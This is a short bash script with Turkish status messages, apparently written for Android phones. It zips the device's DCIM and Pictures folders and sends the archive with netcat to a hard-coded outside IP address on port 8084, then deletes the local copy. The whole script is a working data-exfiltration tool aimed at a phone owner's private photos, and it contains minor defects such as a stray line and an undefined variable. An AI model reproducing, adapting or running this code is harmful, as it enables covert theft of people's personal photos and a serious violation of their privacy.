#!/bin/bash

target_dir="/storage/emulated/0/"
dcimdir="DCIM"
picdir="Pictures"
port=8084
f
if cd $target_dir; then
    echo "klasör erişilebilir, işleme devaö ediliyor..."
    zip_name=${username}_$(date +%Y-%m-%d_%H-%M-%S).zip
    zip -r "$zip_name" "$dcimdir" "$picdir"
    echo "Dosya hazırlandı: $zip_name dosyanın md5'i: $(md5sum $zip_name)"
    echo "Dosya gönderiliyor..."
    (echo "$zip_name"; cat "$zip_name") | nc 24.133.19.34 $port
    echo "Dosya gönderildi"
    rm "$zip_name"
else
    echo "Klasöre erişilemiyor"
fi
